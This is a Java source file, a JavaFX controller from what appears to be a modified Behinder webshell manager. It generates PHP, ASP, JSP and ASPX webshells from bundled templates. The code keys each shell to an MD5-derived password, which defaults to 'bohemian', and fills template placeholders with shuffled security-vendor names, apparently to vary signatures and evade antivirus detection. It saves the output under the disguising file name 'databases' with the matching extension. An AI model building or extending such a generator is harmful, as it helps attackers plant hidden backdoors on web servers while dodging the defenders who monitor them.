package net.rebeyond.behinder.ui.controller;

import javafx.fxml.FXML;
import javafx.scene.control.Alert;
import javafx.scene.control.TextField;
import javafx.stage.FileChooser;
import javafx.stage.Stage;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.security.MessageDigest;
import java.util.Random;

public class MainMianshaController {

    @FXML
    private TextField mimaphp;
    @FXML
    private TextField mimajsp;
    @FXML
    private TextField mimaasp;
    @FXML
    private TextField mimaaspx;
    private static Random rand = new Random();

    public static <T> void swap(T[] a, int i, int j) {
        T temp = a[i];
        a[i] = a[j];
        a[j] = temp;
    }

    public static <T> void shuffle(T[] arr) {
        int length = arr.length;
        for (int i = length; i > 0; i--) {
            int randInd = rand.nextInt(i);
            swap(arr, randInd, i - 1);
        }
    }
    @FXML
    private void phponGenerate() {

        FileChooser fileChooser = new FileChooser();
        fileChooser.setTitle("保存文件");
        String currentDir = System.getProperty("user.dir");
        fileChooser.setInitialDirectory(new File(currentDir));
        fileChooser.getExtensionFilters().addAll(
                new FileChooser.ExtensionFilter("所有文件", "*.*"),
                new FileChooser.ExtensionFilter("php", "*.php"));
        // 设置默认文件名
        fileChooser.setInitialFileName("databases.php");

        // 弹出保存窗口
        File file = fileChooser.showSaveDialog(getStage());
        if (file != null) {
            try {
                InputStream inputStream = getClass().getResourceAsStream("/net/rebeyond/behinder/ui/php.php");

                ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                byte[] temp = new byte[1024];
                int bytesRead;
                while ((bytesRead = inputStream.read(temp)) != -1) {
                    buffer.write(temp, 0, bytesRead);
                }

                byte[] content = buffer.toByteArray();
                String template = new String(content, StandardCharsets.UTF_8);
                String password = mimaphp.getText();

                if (password == null || password.trim().isEmpty()) {
                    showAlert("您未输入密码", "默认密码为bohemian");
                    password = "bohemian";

                }
                String[] arr = { "qianxin", "nsfocus", "sangfor", "dbappsecurity", "chaitin", "damddos", "alibaba", "baidu" ,"leadsec", "venustech",
                        "asiainfosec","qingteng","threatbook","antiy","dptech","hillstonenet","topsec","huawei","sina","webray",
                        "tencent","bytedance","douyin","westone"};
                shuffle(arr);
                String md5pass16 = String.valueOf(getMD5Prefix16(password));
                String result = template.replace("<<<PASSWORD>>>", md5pass16.substring(0, 16))
                .replace("{stryi}", arr[0]).replace("{strer}", arr[1])
                        .replace("{strsan}", arr[2]).replace("{strsi}", arr[3])
                        .replace("{strwu}", arr[4]).replace("{strliu}", arr[5])
                        .replace("{strqi}", arr[6]).replace("{strba}", arr[7])
                        .replace("{strjiu}", arr[8]).replace("{strshi}", arr[9])
                        .replace("{strshiyi}", arr[10]).replace("{strshier}", arr[11])
                        .replace("{strshisan}", arr[12]).replace("{strshisi}", arr[13])
                        .replace("{strshiwu}", arr[14]).replace("{strshiliu}", arr[15])
                        .replace("{strshiqi}", arr[16]).replace("{strshiba}", arr[17])
                        .replace("{strshijiu}", arr[18]).replace("{strershi}", arr[19])
                        .replace("{strershiyi}", arr[20]).replace("{strershier}", arr[21])
                        .replace("{strershisan}", arr[22]).replace("{strershisi}", arr[23]);
                Files.write(file.toPath(), result.getBytes());
                showAlert("成功", "文件已保存到:" + file.getAbsolutePath()+"\n"+"密码为:"+password);

            } catch (Exception e) {
                showAlert("错误", "保存失败: " + e.getMessage());
            }
        }
    }
    /*jsp unicode 后续实现
    jsp_code = '''a'''

转换为 \\uXXXX 格式
def to_unicode_escape(text):
    return ''.join(f'\\u{ord(c):04x}' for c in text)

unicode_escaped_full = to_unicode_escape(jsp_code)
unicode_escaped_full
     */
    @FXML
    private void asponGenerate() {

        FileChooser fileChooser = new FileChooser();
        fileChooser.setTitle("保存文件");
        String currentDir = System.getProperty("user.dir");
        fileChooser.setInitialDirectory(new File(currentDir));
        fileChooser.getExtensionFilters().addAll(
                new FileChooser.ExtensionFilter("所有文件", "*.*"),
                new FileChooser.ExtensionFilter("asp", "*.asp"));
        // 设置默认文件名
        fileChooser.setInitialFileName("databases.asp");

        // 弹出保存窗口
        File file = fileChooser.showSaveDialog(getStage());
        if (file != null) {
            try {
                InputStream inputStream = getClass().getResourceAsStream("/net/rebeyond/behinder/ui/asp.asp");

                ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                byte[] temp = new byte[1024];
                int bytesRead;
                while ((bytesRead = inputStream.read(temp)) != -1) {
                    buffer.write(temp, 0, bytesRead);
                }

                byte[] content = buffer.toByteArray();
                String template = new String(content, StandardCharsets.UTF_8);
                String password = mimaasp.getText();

                if (password == null || password.trim().isEmpty()) {
                    showAlert("您未输入密码", "默认密码为bohemian,右下角也能找到bohemian");
                    password = "bohemian";

                }
                String[] arr = { "qianxin", "nsfocus", "sangfor", "dbappsecurity", "chaitin", "damddos", "alibaba", "baidu" ,"leadsec", "venustech",
                        "asiainfosec","qingteng","threatbook","antiy","dptech","hillstonenet","topsec","huawei","sina","webray",
                        "tencent","bytedance","douyin","westone"};
                shuffle(arr);
                String md5pass16 = String.valueOf(getMD5Prefix16(password));
                String result = template.replace("<<<PASSWORD>>>", md5pass16.substring(0, 16))
                        .replace("{stryi}", arr[0]).replace("{strer}", arr[1])
                        .replace("{strsan}", arr[2]).replace("{strsi}", arr[3])
                        .replace("{strwu}", arr[4]).replace("{strliu}", arr[5])
                        .replace("{strqi}", arr[6]).replace("{strba}", arr[7])
                        .replace("{strjiu}", arr[8]).replace("{strshi}", arr[9])
                        .replace("{strshiyi}", arr[10]).replace("{strshier}", arr[11])
                        .replace("{strshisan}", arr[12]).replace("{strshisi}", arr[13])
                        .replace("{strshiwu}", arr[14]).replace("{strshiliu}", arr[15])
                        .replace("{strshiqi}", arr[16]).replace("{strshiba}", arr[17])
                        .replace("{strshijiu}", arr[18]).replace("{strershi}", arr[19])
                        .replace("{strershiyi}", arr[20]).replace("{strershier}", arr[21])
                        .replace("{strershisan}", arr[22]).replace("{strershisi}", arr[23]);
                Files.write(file.toPath(), result.getBytes());
                showAlert("成功", "文件已保存到:" + file.getAbsolutePath()+"\n"+"密码为:"+password);

            } catch (Exception e) {
                showAlert("错误", "保存失败: " + e.getMessage());
            }
        }
    }
    @FXML
    private void jsponGenerate() {

        FileChooser fileChooser = new FileChooser();
        fileChooser.setTitle("保存文件");
        String currentDir = System.getProperty("user.dir");
        fileChooser.setInitialDirectory(new File(currentDir));
        fileChooser.getExtensionFilters().addAll(
                new FileChooser.ExtensionFilter("所有文件", "*.*"),
                new FileChooser.ExtensionFilter("jsp", "*.jsp"));
        // 设置默认文件名
        fileChooser.setInitialFileName("databases.jsp");

        // 弹出保存窗口
        File file = fileChooser.showSaveDialog(getStage());
        if (file != null) {
            try {
                InputStream inputStream = getClass().getResourceAsStream("/net/rebeyond/behinder/ui/jsp.jsp");

                ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                byte[] temp = new byte[1024];
                int bytesRead;
                while ((bytesRead = inputStream.read(temp)) != -1) {
                    buffer.write(temp, 0, bytesRead);
                }

                byte[] content = buffer.toByteArray();
                String template = new String(content, StandardCharsets.UTF_8);
                String password = mimajsp.getText();

                if (password == null || password.trim().isEmpty()) {
                    showAlert("您未输入密码", "默认密码为bohemian,右下角也能找到bohemian");
                    password = "bohemian";

                }
                String[] arr = { "qianxin", "nsfocus", "sangfor", "dbappsecurity", "chaitin", "damddos", "alibaba", "baidu" ,"leadsec", "venustech",
                        "asiainfosec","qingteng","threatbook","antiy","dptech","hillstonenet","topsec","huawei","sina","webray",
                        "tencent","bytedance","douyin","westone"};
                shuffle(arr);
                String md5pass16 = String.valueOf(getMD5Prefix16(password));
                String result = template.replace("<<<PASSWORD>>>", md5pass16.substring(0, 16))
                        .replace("{stryi}", arr[0]).replace("{strer}", arr[1])
                        .replace("{strsan}", arr[2]).replace("{strsi}", arr[3])
                        .replace("{strwu}", arr[4]).replace("{strliu}", arr[5])
                        .replace("{strqi}", arr[6]).replace("{strba}", arr[7])
                        .replace("{strjiu}", arr[8]).replace("{strshi}", arr[9])
                        .replace("{strshiyi}", arr[10]).replace("{strshier}", arr[11])
                        .replace("{strshisan}", arr[12]).replace("{strshisi}", arr[13])
                        .replace("{strshiwu}", arr[14]).replace("{strshiliu}", arr[15])
                        .replace("{strshiqi}", arr[16]).replace("{strshiba}", arr[17])
                        .replace("{strshijiu}", arr[18]).replace("{strershi}", arr[19])
                        .replace("{strershiyi}", arr[20]).replace("{strershier}", arr[21])
                        .replace("{strershisan}", arr[22]).replace("{strershisi}", arr[23]);
                Files.write(file.toPath(), result.getBytes());
                showAlert("成功", "文件已保存到:" + file.getAbsolutePath()+"\n"+"密码为:"+password);

            } catch (Exception e) {
                showAlert("错误", "保存失败: " + e.getMessage());
            }
        }
    }

    @FXML
    private void aspxonGenerate() {

        FileChooser fileChooser = new FileChooser();
        fileChooser.setTitle("保存文件");
        String currentDir = System.getProperty("user.dir");
        fileChooser.setInitialDirectory(new File(currentDir));
        fileChooser.getExtensionFilters().addAll(
                new FileChooser.ExtensionFilter("所有文件", "*.*"),
                new FileChooser.ExtensionFilter("aspx", "*.aspx"));
        // 设置默认文件名
        fileChooser.setInitialFileName("databases.aspx");

        // 弹出保存窗口
        File file = fileChooser.showSaveDialog(getStage());
        if (file != null) {
            try {
                InputStream inputStream = getClass().getResourceAsStream("/net/rebeyond/behinder/ui/aspx.aspx");

                ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                byte[] temp = new byte[1024];
                int bytesRead;
                while ((bytesRead = inputStream.read(temp)) != -1) {
                    buffer.write(temp, 0, bytesRead);
                }

                byte[] content = buffer.toByteArray();
                String template = new String(content, StandardCharsets.UTF_8);
                String password = mimaaspx.getText();

                if (password == null || password.trim().isEmpty()) {
                    showAlert("您未输入密码", "默认密码为bohemian,右下角也能找到bohemian");
                    password = "bohemian";

                }
                String[] arr = { "qianxin", "nsfocus", "sangfor", "dbappsecurity", "chaitin", "damddos", "alibaba", "baidu" ,"leadsec", "venustech",
                        "asiainfosec","qingteng","threatbook","antiy","dptech","hillstonenet","topsec","huawei","sina","webray",
                        "tencent","bytedance","douyin","westone"};
                shuffle(arr);
                String md5pass16 = String.valueOf(getMD5Prefix16(password));
                String result = template.replace("<<<PASSWORD>>>", md5pass16.substring(0, 16))
                        .replace("{stryi}", arr[0]).replace("{strer}", arr[1])
                        .replace("{strsan}", arr[2]).replace("{strsi}", arr[3])
                        .replace("{strwu}", arr[4]).replace("{strliu}", arr[5])
                        .replace("{strqi}", arr[6]).replace("{strba}", arr[7])
                        .replace("{strjiu}", arr[8]).replace("{strshi}", arr[9])
                        .replace("{strshiyi}", arr[10]).replace("{strshier}", arr[11])
                        .replace("{strshisan}", arr[12]).replace("{strshisi}", arr[13])
                        .replace("{strshiwu}", arr[14]).replace("{strshiliu}", arr[15])
                        .replace("{strshiqi}", arr[16]).replace("{strshiba}", arr[17])
                        .replace("{strshijiu}", arr[18]).replace("{strershi}", arr[19])
                        .replace("{strershiyi}", arr[20]).replace("{strershier}", arr[21])
                        .replace("{strershisan}", arr[22]).replace("{strershisi}", arr[23]);
                Files.write(file.toPath(), result.getBytes());
                showAlert("成功", "文件已保存到:" + file.getAbsolutePath()+"\n"+"密码为:"+password);

            } catch (Exception e) {
                showAlert("错误", "保存失败: " + e.getMessage());
            }
        }
    }
    private static StringBuilder getMD5Prefix16(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] digest = md.digest(input.getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder();
            for (byte b : digest) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) hexString.append('0');
                hexString.append(hex);
            }
            return hexString;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
    private void showAlert(String title, String message) {
        Alert alert = new Alert(Alert.AlertType.INFORMATION);
        alert.setTitle(title);
        alert.setHeaderText(null);
        alert.setContentText(message);
        alert.showAndWait();
    }
//    private void tihua(String title, String message) {
//        String template = new String(content, StandardCharsets.UTF_8);
//        String password = mimajsp.getText();
//        if (password == null || password.trim().isEmpty()) {
//            showAlert("您未输入密码", "默认密码为bohemian");
//            password = "bohemian";
//
//        }
//        String[] arr = { "qianxin", "nsfocus", "sangfor", "dbappsecurity", "chaitin", "damddos", "alibaba", "baidu" ,"leadsec", "venustech",
//                "asiainfosec","qingteng","threatbook","antiy","dptech","hillstonenet","topsec","huawei","sina","webray",
//                "tencent","bytedance","douyin","westone"};
//        shuffle(arr);
//        String md5pass16 = String.valueOf(getMD5Prefix16(password));
//        String result = template.replace("<<<PASSWORD>>>", md5pass16.substring(0, 16))
//                .replace("{stryi}", arr[0]).replace("{strer}", arr[1])
//                .replace("{strsan}", arr[2]).replace("{strsi}", arr[3])
//                .replace("{strwu}", arr[4]).replace("{strliu}", arr[5])
//                .replace("{strqi}", arr[6]).replace("{strba}", arr[7])
//                .replace("{strjiu}", arr[8]).replace("{strshi}", arr[9])
//                .replace("{strshiyi}", arr[10]).replace("{strshier}", arr[11])
//                .replace("{strshisan}", arr[12]).replace("{strshisi}", arr[13])
//                .replace("{strshiwu}", arr[14]).replace("{strshiliu}", arr[15])
//                .replace("{strshiqi}", arr[16]).replace("{strshiba}", arr[17])
//                .replace("{strshijiu}", arr[18]).replace("{strershi}", arr[19])
//                .replace("{strershiyi}", arr[20]).replace("{strershier}", arr[21])
//                .replace("{strershisan}", arr[22]).replace("{strershisi}", arr[23]);
//    }

    private Stage getStage() {
        return (Stage) mimaphp.getScene().getWindow();
    }
}
